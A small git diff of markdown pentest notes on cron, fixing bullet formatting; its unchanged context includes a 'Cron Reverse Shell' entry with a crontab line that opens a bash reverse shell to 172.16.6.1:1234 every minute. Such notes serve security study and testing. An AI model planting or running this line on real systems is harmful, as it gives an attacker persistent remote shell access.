@@ -11,9 +11,9 @@
 `cat /etc/crontab`
 - Allows you to see the system wide cron jobs
 `crontab -e` 
--Allows you to edit the file for your users cron jobs
+- Allows you to edit the file for your users cron jobs
 `crontab -l` 
--Prints the cron jobs set for your user
+- Prints the cron jobs set for your user
 #### Cron Reverse Shell
 `* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/172.16.6.1/1234 0>&1`
 - Creates a reverse shell that call back to your attack box ip every minute
